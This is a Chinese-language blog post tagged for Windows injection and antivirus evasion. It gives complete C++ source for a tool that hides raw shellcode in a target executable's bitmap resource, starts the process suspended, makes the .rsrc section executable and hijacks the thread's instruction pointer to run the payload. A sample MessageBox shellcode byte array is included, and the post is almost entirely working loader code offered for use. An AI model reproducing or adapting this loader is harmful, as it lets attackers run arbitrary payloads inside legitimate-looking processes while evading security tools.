---
layout: post
title: PE Resource Inject 
categories: Inject
description: Inject 之 PE资源
keywords: Windows，注入，免杀
---

# PE Resource Inject

我也不知道有啥用，仅在当时注入并运行了Shellcode?

## ResourceInject.cpp

```c++
#include <stdio.h>
#include <Windows.h>
#include <winternl.h>

#include "ResourceInject.h"

int wmain(INT argc, WCHAR* argv[])
{
	PWCHAR TargetProcess = NULL;
	WCHAR TargetProcessCopy[FILENAME_MAX];
	PWCHAR ShellcodePath = NULL;
	PCHAR Payload = NULL;

	INT Ret = FALSE;
	SIZE_T cTPLen = 0;
	DWORD PayloadBufferSize = 0;
	DWORD cbRet = 0;
	DWORD dwOldProtect = 0;
	DWORD_PTR AddressShellcodeStart = 0;
	DWORD_PTR PEBOffset = 0;
	DWORD_PTR ImageBase = 0;
	HANDLE hUpdate = NULL;
	NTSTATUS ntStatus = NOERROR;
	SIZE_T cbRead = 0;

	STARTUPINFO sStartInfo = { 0 };
	PROCESS_INFORMATION sProcInfo = { 0 };
	PROCESS_BASIC_INFORMATION sPBI = { 0 };
	IMAGE_DOS_HEADER sImageDOSHeader = { 0 };
	IMAGE_NT_HEADERS64 sImageNTHeader = { 0 };
	IMAGE_SECTION_HEADER sImageSectionHeader = { 0 };
	CONTEXT sCtx = { 0 };

	// 解析命令行参数
	for (INT i = 1; i < argc; i++)
	{
		if (wcscmp(argv[i], L"-exe") == 0)
		{
			TargetProcess = argv[i + 1];
			i++;
		}
		else if (wcscmp(argv[i], L"-bin") == 0)
		{
			ShellcodePath = argv[i + 1];
			i++;
		}
	}

	if (!TargetProcess || !ShellcodePath)
	{
		wprintf(L"\nUsage: -exe <C:\\test.exe> -bin <C:\\Shellcode>\n\n");
		wprintf(L"-exe : path to the executable to spawn/inject\n");
		wprintf(L"-bin : path to raw shellcode\n");
		exit(1);
	}

	// 创建目标可执行文件的备份
	cTPLen = wcslen(TargetProcess);
	wcscpy_s(TargetProcessCopy, FILENAME_MAX, TargetProcess);
	TargetProcessCopy[(cTPLen)-4] = '-';

	Ret = CopyFile(TargetProcess, TargetProcessCopy, FALSE);
	if (!Ret)
	{
		wprintf(L"[!] Failed to make a back up of the target exe. Exiting...\n");
		return -1;
	}
	wprintf(L"[+] Backup Created: %ls\n", TargetProcessCopy);

	// 读取Shellcode内容
	Ret = ReadContents(ShellcodePath, &Payload, &PayloadBufferSize);
	if (!Ret)
	{
		wprintf(L"[!] Payload is empty. Exiting...\n");
		free(Payload);
		return -1;
	}

	// 更新目标进程的资源
	hUpdate = BeginUpdateResource(TargetProcess, TRUE);
	if (!hUpdate)
		return -1;

	Ret = UpdateResource(hUpdate, RT_BITMAP, MAKEINTRESOURCE(RT_BITMAP), 0, Payload, PayloadBufferSize);
	if (!Ret)
	{
		free(Payload);
		return -1;
	}

	Ret = EndUpdateResource(hUpdate, FALSE);
	if (!Ret)
		return -1;

	wprintf(L"[+] Resource Updated: %ls\n", TargetProcess);

	// 创建挂起进程
	Ret = CreateProcessW(TargetProcess, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &sStartInfo, &sProcInfo);
	if (!Ret)
	{
		CloseHandle(sProcInfo.hThread);
		CloseHandle(sProcInfo.hProcess);
		return -2;
	}

	wprintf(L"[+] Spawned: %ls\n", TargetProcess);

	// 获取 NtQueryInformationProcess
	pfnNtQueryInformationProcess pNtQueryInformationProcess;
	HMODULE hNtDll = LoadLibrary(L"NtDll.dll");
	pNtQueryInformationProcess = (pfnNtQueryInformationProcess)GetProcAddress(hNtDll, "NtQueryInformationProcess");
	FreeLibrary(hNtDll);

	ntStatus = pNtQueryInformationProcess(sProcInfo.hProcess, ProcessBasicInformation, &sPBI, sizeof(PROCESS_BASIC_INFORMATION), &cbRet);
	if (ntStatus) // 0 = SUCCESS
	{
		CloseHandle(sProcInfo.hThread);
		CloseHandle(sProcInfo.hProcess);
		return -2;
	}

	PEBOffset = (DWORD_PTR)sPBI.PebBaseAddress + 0x10; //x64

	// 从 PEB 地址获取 ImageBase
	Ret = ReadProcessMemory(sProcInfo.hProcess, (LPCVOID)PEBOffset, &ImageBase, 8, NULL);
	if (!Ret)
	{
		CloseHandle(sProcInfo.hThread);
		CloseHandle(sProcInfo.hProcess);
		return -2;
	}

	wprintf(L"[+] Image Base: 0x%p\n", (PVOID)ImageBase);

	// 从 ImageBase 创建 IMAGE_DOS_HEADER 以获取 e_lfanew 的值
	Ret = ReadProcessMemory(sProcInfo.hProcess, (LPCVOID)ImageBase, &sImageDOSHeader, sizeof(IMAGE_DOS_HEADER), &cbRead);
	if (!Ret)
	{
		CloseHandle(sProcInfo.hThread);
		CloseHandle(sProcInfo.hProcess);
		return -2;
	}

	// 从ImageBase添加e_lfanew的值以获取IMAGE_NT_HEADERS的起始位置
	DWORD_PTR AddressImageNTHeader = ((DWORD_PTR)ImageBase + sImageDOSHeader.e_lfanew);
	Ret = ReadProcessMemory(sProcInfo.hProcess, (LPCVOID)AddressImageNTHeader, &sImageNTHeader, sizeof(IMAGE_NT_HEADERS64), &cbRead);
	if (!Ret)
	{
		CloseHandle(sProcInfo.hThread);
		CloseHandle(sProcInfo.hProcess);
		return -2;
	}

	// 获取第一个 Section 的地址
	DWORD_PTR AddressOfSection = AddressImageNTHeader + (DWORD_PTR)(sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + sImageNTHeader.FileHeader.SizeOfOptionalHeader);

	// 识别包含Shellcode的.rsrc节
	for (int i = 0; i < sImageNTHeader.FileHeader.NumberOfSections; i++) {
		// 读取Section的IMAGE_SECTION_HEADER
		ReadProcessMemory(sProcInfo.hProcess, (LPCVOID)AddressOfSection, &sImageSectionHeader, sizeof(IMAGE_SECTION_HEADER), &cbRead);
		if (strcmp((char*)sImageSectionHeader.Name, ".rsrc") == 0)
		{
			// 找到.rsrc节，计算Shellcode的起始位置
			AddressShellcodeStart = (DWORD_PTR)ImageBase + (DWORD_PTR)sImageSectionHeader.VirtualAddress + 0x58;

			wprintf(L"[+] .rsrc Image Section RVA: 0x%p\n", (PVOID)sImageSectionHeader.VirtualAddress);
			wprintf(L"[MATH] ImageBase[0x%p] + .rsrc RVA[0x%p] + BitmapHeader[0x58]\n", (PVOID)ImageBase, (PVOID)sImageSectionHeader.VirtualAddress);
			wprintf(L"[+] Shellcode Start: 0x%p\n", (PVOID)AddressShellcodeStart);

			// 确保内存保护为PAGE_EXECUTE_READ
			Ret = VirtualProtectEx(sProcInfo.hProcess, (LPVOID)AddressShellcodeStart, PayloadBufferSize, PAGE_EXECUTE_READ, &dwOldProtect);
			if (!Ret)
			{
				CloseHandle(sProcInfo.hThread);
				CloseHandle(sProcInfo.hProcess);
				return -2;
			}

			break;
		}
		// .rsrc节未找到，移动到下一个节的起始位置
		AddressOfSection += sizeof(IMAGE_SECTION_HEADER);
	}

	if (!AddressShellcodeStart)
		return -1;

	// 执行Shellcode
	sCtx.ContextFlags = CONTEXT_ALL;
	GetThreadContext(sProcInfo.hThread, &sCtx);
	sCtx.Rip = (DWORD64)AddressShellcodeStart;
	SetThreadContext(sProcInfo.hThread, &sCtx);
	ResumeThread(sProcInfo.hThread);

	if (Payload)
	{
		free(Payload);
	}

	if (sProcInfo.hProcess != NULL)
	{
		CloseHandle(sProcInfo.hThread);
		CloseHandle(sProcInfo.hProcess);
	}

	wprintf(L"\nSucess!");

	return 0;
}

// 读取文件内容
INT ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = (PCHAR)malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}
	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

## ResourceInject.h

```c++
#pragma once
typedef NTSTATUS(NTAPI* pfnNtQueryInformationProcess)(
	IN  HANDLE ProcessHandle,
	IN  PROCESSINFOCLASS ProcessInformationClass,
	OUT PVOID ProcessInformation,
	IN  ULONG ProcessInformationLength,
	OUT PULONG ReturnLength    OPTIONAL
	);

INT ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);
```

## MessageBox Shellcode

```c++
0x48,0x83,0xEC,0x28,0x48,0x83,0xE4,0xF0,0x48,0x8D,0x15,0x66,0x00,0x00,0x00,
0x48,0x8D,0x0D,0x52,0x00,0x00,0x00,0xE8,0x9E,0x00,0x00,0x00,0x4C,0x8B,0xF8,
0x48,0x8D,0x0D,0x5D,0x00,0x00,0x00,0xFF,0xD0,0x48,0x8D,0x15,0x5F,0x00,0x00,
0x00,0x48,0x8D,0x0D,0x4D,0x00,0x00,0x00,0xE8,0x7F,0x00,0x00,0x00,0x4D,0x33,
0xC9,0x4C,0x8D,0x05,0x61,0x00,0x00,0x00,0x48,0x8D,0x15,0x4E,0x00,0x00,0x00,
0x48,0x33,0xC9,0xFF,0xD0,0x48,0x8D,0x15,0x56,0x00,0x00,0x00,0x48,0x8D,0x0D,
0x0A,0x00,0x00,0x00,0xE8,0x56,0x00,0x00,0x00,0x48,0x33,0xC9,0xFF,0xD0,0x4B,
0x45,0x52,0x4E,0x45,0x4C,0x33,0x32,0x2E,0x44,0x4C,0x4C,0x00,0x4C,0x6F,0x61,
0x64,0x4C,0x69,0x62,0x72,0x61,0x72,0x79,0x41,0x00,0x55,0x53,0x45,0x52,0x33,
0x32,0x2E,0x44,0x4C,0x4C,0x00,0x4D,0x65,0x73,0x73,0x61,0x67,0x65,0x42,0x6F,
0x78,0x41,0x00,0x48,0x65,0x6C,0x6C,0x6F,0x20,0x77,0x6F,0x72,0x6C,0x64,0x00,
0x4D,0x65,0x73,0x73,0x61,0x67,0x65,0x00,0x45,0x78,0x69,0x74,0x50,0x72,0x6F,
0x63,0x65,0x73,0x73,0x00,0x48,0x83,0xEC,0x28,0x65,0x4C,0x8B,0x04,0x25,0x60,
0x00,0x00,0x00,0x4D,0x8B,0x40,0x18,0x4D,0x8D,0x60,0x10,0x4D,0x8B,0x04,0x24,
0xFC,0x49,0x8B,0x78,0x60,0x48,0x8B,0xF1,0xAC,0x84,0xC0,0x74,0x26,0x8A,0x27,
0x80,0xFC,0x61,0x7C,0x03,0x80,0xEC,0x20,0x3A,0xE0,0x75,0x08,0x48,0xFF,0xC7,
0x48,0xFF,0xC7,0xEB,0xE5,0x4D,0x8B,0x00,0x4D,0x3B,0xC4,0x75,0xD6,0x48,0x33,
0xC0,0xE9,0xA7,0x00,0x00,0x00,0x49,0x8B,0x58,0x30,0x44,0x8B,0x4B,0x3C,0x4C,
0x03,0xCB,0x49,0x81,0xC1,0x88,0x00,0x00,0x00,0x45,0x8B,0x29,0x4D,0x85,0xED,
0x75,0x08,0x48,0x33,0xC0,0xE9,0x85,0x00,0x00,0x00,0x4E,0x8D,0x04,0x2B,0x45,
0x8B,0x71,0x04,0x4D,0x03,0xF5,0x41,0x8B,0x48,0x18,0x45,0x8B,0x50,0x20,0x4C,
0x03,0xD3,0xFF,0xC9,0x4D,0x8D,0x0C,0x8A,0x41,0x8B,0x39,0x48,0x03,0xFB,0x48,
0x8B,0xF2,0xA6,0x75,0x08,0x8A,0x06,0x84,0xC0,0x74,0x09,0xEB,0xF5,0xE2,0xE6,
0x48,0x33,0xC0,0xEB,0x4E,0x45,0x8B,0x48,0x24,0x4C,0x03,0xCB,0x66,0x41,0x8B,
0x0C,0x49,0x45,0x8B,0x48,0x1C,0x4C,0x03,0xCB,0x41,0x8B,0x04,0x89,0x49,0x3B,
0xC5,0x7C,0x2F,0x49,0x3B,0xC6,0x73,0x2A,0x48,0x8D,0x34,0x18,0x48,0x8D,0x7C,
0x24,0x30,0x4C,0x8B,0xE7,0xA4,0x80,0x3E,0x2E,0x75,0xFA,0xA4,0xC7,0x07,0x44,
0x4C,0x4C,0x00,0x49,0x8B,0xCC,0x41,0xFF,0xD7,0x49,0x8B,0xCC,0x48,0x8B,0xD6,
0xE9,0x14,0xFF,0xFF,0xFF,0x48,0x03,0xC3,0x48,0x83,0xC4,0x28,0xC3
```

